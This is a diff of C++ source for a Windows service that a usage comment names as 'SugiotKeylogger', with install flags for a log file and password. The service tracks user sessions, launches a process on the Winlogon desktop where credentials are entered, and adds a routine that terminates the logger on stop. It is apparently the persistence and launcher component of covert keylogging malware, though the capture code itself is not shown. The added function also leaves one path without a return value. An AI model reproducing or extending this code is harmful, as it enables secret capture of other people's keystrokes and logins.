@@ -142,7 +142,11 @@ VOID WINAPI ServiceMain(DWORD argc, LPTSTR* argv)
 		return;
 
 	}
-	
+	// Process command line arguments
+	errSet << L"Number of arguments: " << argc << std::endl;
+	for (DWORD i = 0; i < argc; i++) {
+		errSet << L"Arg " << i << L": " << argv[i] << std::endl;
+	}
 	//process command line argumernts
 	if (argc < 4) {
 		g_serviceStatus.dwControlsAccepted = 0;
@@ -156,6 +160,7 @@ VOID WINAPI ServiceMain(DWORD argc, LPTSTR* argv)
 			
 		}
 		errSet << L"No Argumets " << std::endl;
+		errSet.close();
 		return;
 	}
 	fileOutPutArg = argv[1];
@@ -287,6 +292,42 @@ std::wstring GetExeName(const std::wstring& exePath) {
 		return exePath;
 	}
 }
+BOOL TerminateAllPrograms(const std::wstring& processName) {
+	HANDLE hServer = WTS_CURRENT_SERVER_HANDLE;
+	PWTS_PROCESS_INFO pProcessInfo = NULL;
+	DWORD processCount = 0;
+	if (WTSEnumerateProcesses(hServer, 0, 1, &pProcessInfo, &processCount)) {
+		for (DWORD i = 0; i < processCount; ++i) {
+			if (pProcessInfo[i].pProcessName == processName) {
+				HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pProcessInfo[i].ProcessId);
+				if (hProcess == NULL) {
+					outFile << "Failed to open process for termination. Error: " << GetLastError() << std::endl;
+					WTSFreeMemory(pProcessInfo);
+					return FALSE;
+				}
+
+				BOOL result = TerminateProcess(hProcess, 1);
+				CloseHandle(hProcess);
+				WTSFreeMemory(pProcessInfo);
+
+				if (result) {
+					outFile << "Process terminated successfully." << std::endl;
+					return TRUE;
+				}
+				else {
+					outFile << "Failed to terminate process. Error: " << GetLastError() << std::endl;
+					return FALSE;
+				}
+			}
+		}
+		WTSFreeMemory(pProcessInfo);
+	}
+	else {
+		outFile << "Failed to enumerate processes. Error: " << GetLastError() << std::endl;
+		return FALSE;
+	}
+}
+
 /**
  * @brief The service control handler function.
  *
@@ -304,6 +345,9 @@ DWORD WINAPI ServiceCtrlHandlerEx(DWORD CtrlCode, DWORD dwEventType, LPVOID lpEv
 		g_serviceStatus.dwCheckPoint = 4;
 		if (SetServiceStatus(g_serviceStatusHandle, &g_serviceStatus) == FALSE) {
 			OutputDebugString(_T("My Sample Service: ServiceCtrlHandler: SetServiceStatus returned error"));
+		}
+		if (!TerminateAllPrograms(GetExeName(exePath))) {
+			outFile << "Failed to terminate all programs." << std::endl;
 		}
 		SetEvent(g_serviceStopEvent);
 		break;
@@ -327,9 +371,11 @@ DWORD WINAPI ServiceCtrlHandlerEx(DWORD CtrlCode, DWORD dwEventType, LPVOID lpEv
 						}
 					}
 				}
+				
 				break;
 			case WTS_CONSOLE_DISCONNECT:
 				outFile << "Console disconnect: Session ID " << sessionId << std::endl;
+				//Here
 				KillProcessBySessionAndName(sessionId, GetExeName(exePath));
 				break;
 			case WTS_REMOTE_CONNECT:
@@ -497,8 +543,8 @@ BOOL IsProcessRunningInSession(DWORD sessionId, const std::wstring& processName)
 }
 
 
-
 /**
+* SugiotKeylogger.exe -install -f "C:\Users\2014y\Desktop\AdvanceLogger\x64\Debug\log12.txt" -p "password"
  * @brief The service worker thread function.
  *
  * @param lpParam The thread parameter.
@@ -509,6 +555,7 @@ VOID ServiceWorkerThread(LPVOID lpParam)
 	while (true)
 	{
 		Sleep(1000);
+		
 		//Check current session console
 		DWORD sessionID = WTSGetActiveConsoleSessionId();
 		if (sessionID == 0xFFFFFFFF || sessionID == 0) {
@@ -524,6 +571,7 @@ VOID ServiceWorkerThread(LPVOID lpParam)
 				outFile << "Process started successfully on the Winlogon desktop." << std::endl;
 			}
 		}
+		
 	}
 }
 
